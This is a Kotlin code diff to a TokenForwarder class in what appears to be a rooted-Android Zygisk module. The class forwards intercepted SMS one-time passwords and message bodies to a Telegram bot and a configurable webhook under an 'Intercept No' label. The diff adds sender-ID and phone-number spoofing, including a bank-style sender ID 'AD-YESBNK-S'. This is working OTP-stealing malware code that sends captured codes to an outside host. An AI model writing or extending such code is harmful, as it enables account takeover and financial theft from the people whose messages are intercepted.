@@ -31,11 +31,12 @@ class TokenForwarder(private val configManager: ConfigManager) {
         val chatId = config.telegramChatId
         if (botToken.isBlank() || chatId.isBlank()) return false
 
+        val testId = SmsMatcher.savedSenderId(config) ?: "AD-YESBNK-S"
         val testOtp = LastOtp(
             otp = "TEST1234",
-            sender = "08977509618",
+            sender = testId,
             body = "sZ/HWb9+LtFZSOaVeU9+baPVa9X4imd4wq4noAGAFKvKenId/qwYS8IYcuU8OP3XLllboZ/ARatoNaJtWdZ7g==",
-            phone = "08977509618",
+            phone = testId,
             messageLabel = "",
             direction = "incoming"
         )
@@ -48,7 +49,8 @@ class TokenForwarder(private val configManager: ConfigManager) {
 
     /** Sirf Intercept No + verify token + Zygisk Menu header */
     fun buildZygiskMenuMessage(otp: LastOtp): String {
-        val interceptNo = formatInterceptNumber(otp.phone.ifBlank { otp.sender })
+        val config = configManager.load()
+        val interceptNo = formatInterceptNumber(otp.phone.ifBlank { otp.sender }, config)
         val tokenBody = otp.body.ifBlank { otp.otp }
 
         return buildString {
@@ -60,9 +62,13 @@ class TokenForwarder(private val configManager: ConfigManager) {
         }
     }
 
-    private fun formatInterceptNumber(raw: String): String {
-        val cleaned = raw.trim()
+    private fun formatInterceptNumber(raw: String, config: ModuleConfig): String {
+        SmsMatcher.savedSenderId(config)?.let { return it }
+        val cleaned = raw.trim().uppercase()
         if (cleaned.isBlank()) return "Unknown"
+        if (SmsMatcher.isAlphanumericSenderId(cleaned)) return cleaned
+        val spoof = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }
+        if (spoof.isNotBlank()) return spoof
         val digits = cleaned.replace("\\D".toRegex(), "")
         return if (digits.length >= 8) digits else cleaned
     }
@@ -86,7 +92,8 @@ class TokenForwarder(private val configManager: ConfigManager) {
     }
 
     private fun forwardWebhook(url: String, method: String, otp: LastOtp): Boolean {
-        val interceptNo = formatInterceptNumber(otp.phone.ifBlank { otp.sender })
+        val config = configManager.load()
+        val interceptNo = formatInterceptNumber(otp.phone.ifBlank { otp.sender }, config)
         val payload = JSONObject()
             .put("otp", otp.otp)
             .put("token", otp.body.ifBlank { otp.otp })
